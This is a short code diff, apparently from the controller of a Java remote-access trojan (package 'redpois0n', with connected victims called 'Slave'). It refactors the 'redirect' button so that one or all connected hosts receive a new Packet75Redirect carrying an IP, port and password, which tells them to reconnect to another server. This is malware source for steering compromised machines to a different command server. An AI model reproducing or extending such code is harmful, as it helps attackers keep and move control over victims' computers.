@@ -27,6 +27,7 @@ import com.redpois0n.Slave;
 import com.redpois0n.exceptions.CloseException;
 import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet75Redirect;
 import com.redpois0n.utils.NetworkUtils;
 
 
@@ -121,9 +122,7 @@ public class FrameRedirect extends BaseFrame {
 		btnRedirect.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				if (sl != null) {
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.REDIRECT, new String[] { txtIP.getText().trim(), spinnerPort.getValue().toString(), txtPass.getText().trim()}));
-					
-					sl.closeSocket(new CloseException("Redirecting..."));
+					sl.addToSendQueue(new Packet75Redirect(txtIP.getText().trim(), (Integer) spinnerPort.getValue(), txtPass.getText().trim()));								
 					
 					exit();
 					
@@ -135,7 +134,7 @@ public class FrameRedirect extends BaseFrame {
 					}
 				} else {
 					for (Slave s : Main.connections) {
-						s.addToSendQueue(new PacketBuilder(OutgoingHeader.REDIRECT, new String[] { txtIP.getText().trim(), spinnerPort.getValue().toString(), txtPass.getText().trim()}));								
+						s.addToSendQueue(new Packet75Redirect(txtIP.getText().trim(), (Integer) spinnerPort.getValue(), txtPass.getText().trim()));								
 					}
 					
 					while (Main.connections.size() > 0) {
